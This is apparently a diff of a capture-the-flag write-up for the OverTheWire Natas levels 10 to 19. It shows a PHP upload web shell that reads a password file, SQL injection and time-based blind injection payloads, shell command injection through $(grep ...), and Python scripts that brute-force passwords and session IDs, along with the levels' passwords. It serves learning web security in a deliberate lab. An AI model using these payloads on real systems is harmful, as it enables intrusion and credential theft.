@@ -3,8 +3,8 @@
 ## level 10
 
 ```php
-// http://natas10.natas.labs.overthewire.org/index-source.html
 <?php
+// http://natas10.natas.labs.overthewire.org/index-source.html
 $key = "";
 
 if(array_key_exists("needle", $_REQUEST)) {
@@ -34,8 +34,8 @@ U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 ## level 11
 
 ```php
-// http://natas11.natas.labs.overthewire.org/index-source.html
 <?php
+// http://natas11.natas.labs.overthewire.org/index-source.html
 $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
 
 function xor_encrypt($in) {
@@ -185,6 +185,8 @@ So we create a file looks like an image.
 $ echo -e '\xff\xd8\xff\xe0<?passthru("cat /etc/natas_webpass/natas14");?>' > ving.php
 ```
 
+Then do the same as level 12.
+
 ```
 $ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/ -F 'filename=mx7ozjvm3x.php' -F 'uploadedfile=@ving.php'
 ```
@@ -196,4 +198,201 @@ The file <a href="upload/6xyuj68rtk.php">upload/6xyuj68rtk.php</a> has been uplo
 ```
 $ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/upload/6xyuj68rtk.php
 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+```
+
+## level 14
+
+Simple SQL injection.
+
+```
+$ curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 http://natas14.natas.labs.overthewire.org/?debug -F 'username=ving' -F 'password=" or "0" = "0'
+```
+
+```
+Executing query: SELECT * from users where username="ving" and password="" or "0" = "0"
+Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+```
+
+## level 15
+
+This level will not give us the password, but we can guess it using SQL injection.
+
+```
+$ curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/?debug -F 'username=natas16" and password like binary "W%'
+```
+
+```
+Executing query: SELECT * from users where username="natas16" and password like binary "W%"
+This user exists.
+```
+
+Note: ```like binary``` is case sensitive.
+
+Now we know the first character in password is ```W```.
+
+Search for the password.
+
+```python
+#!/usr/bin/env python3
+import requests
+
+chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
+        [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
+        [chr(i) for i in range(ord("0"),ord("9")+1)]
+password = ''
+for i in range(32):
+    for ch in chars:
+        data = {'username': 'natas16" and password like binary "' + password + ch + '%'}
+        auth = ('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+        if 'This user exists' in requests.post('http://natas15.natas.labs.overthewire.org/?debug', auth = auth, data = data).text:
+            password += ch
+            print(password)
+            break
+```
+
+```
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+
+## level 16
+
+Like level 10, the input can't contain ```[```, ```;```, ```|```, ```&```, <code>`</code>, ```\``` , ```'```, ```"```, and ```]```.
+We can still inject other command using ```$(command)```.
+
+```
+$ curl -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh http://natas16.natas.labs.overthewire.org/ -F 'needle=$(grep -E ^a.*$ /etc/natas_webpass/natas17)hacker'
+```
+
+```
+Output:
+hacker
+hacker's
+hackers
+```
+
+If the password is start with ```a```, there will be no output.
+In this way, we can search for the password.
+
+```python
+#!/usr/bin/env python3
+import requests
+
+chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
+        [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
+        [chr(i) for i in range(ord("0"),ord("9")+1)]
+password = ''
+
+for i in range(32):
+    for ch in chars:
+        params = {'needle': '$(grep -E ^' + password + ch + '.*$ /etc/natas_webpass/natas17)hacker'}
+        auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
+        if 'hacker' not in requests.get('http://natas16.natas.labs.overthewire.org', params = params, auth = auth).text:
+            password += ch
+            print(password)
+            break
+```
+
+```
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+```
+
+## level 17
+
+This level is upgrade of level 16.
+We can't see the result of SQL injection directly.
+We are going to use time-based blind SQL injections to search for the password.
+
+```
+$ curl -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/?debug -F 'username=natas18" and if(password like binary "x%", sleep(5), null) #'
+```
+
+If the password starts with ```x```, the result will be returned after a sleep.
+
+Start search for the password.
+
+```python
+#!/usr/bin/env python3
+import requests
+
+chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
+        [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
+        [chr(i) for i in range(ord("0"),ord("9")+1)]
+password = ''
+
+for i in range(32):
+    for ch in chars:
+        data = {'username': 'natas18" and if (password like binary "' + password + ch + '%", sleep(5), null) #'}
+        auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
+        try:
+            requests.post('http://natas17.natas.labs.overthewire.org/?debug', data = data, auth = auth, timeout = 1)
+        except requests.exceptions.Timeout:
+            password += ch
+            print(password)
+            break
+```
+
+```
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+```
+
+## level 18
+
+```php
+<?php
+// http://natas18.natas.labs.overthewire.org/index-source.html
+$maxid = 640; // 640 should be enough for everyone
+?>
+```
+
+We can easily cover all 640 ```PHPSESSID``` to find out admin.
+
+```python
+#!/usr/bin/env python3
+import requests
+
+for i in range(641):
+    auth = ('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+    cookies = {'PHPSESSID': str(i)}
+    r = requests.get('http://natas18.natas.labs.overthewire.org/', auth = auth, cookies = cookies)
+    if 'You are an admin' in r.text:
+        print(r.text)
+        break
+```
+
+```
+You are an admin. The credentials for the next level are:
+Username: natas19
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+```
+
+## level 19
+
+This level the ```PHPSESSID``` field of the cookie is not a simple number.
+Let me see some samples.
+
+```
+PHPSESSID: 3332352d61      ~   325-a
+PHPSESSID: 39342d617364    ~   94-asd
+PHPSESSID: 3139382d617364  ~   198-asd
+```
+
+Obviously the ```PHPSESSID``` consists of a number and a username and every character is expressed in hexadecimal.
+
+```python
+#!/usr/bin/env python3
+import requests
+
+for i in range(641):
+    auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
+    cookies = {'PHPSESSID': ''.join([hex(ord(ch))[2:] for ch in str(i)+"-admin"])}
+    r = requests.get('http://natas19.natas.labs.overthewire.org/', auth = auth, cookies = cookies)
+    if 'You are an admin' in r.text:
+        print(r.text)
+        break
+```
+
+```
+You are an admin. The credentials for the next level are:
+Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 ```
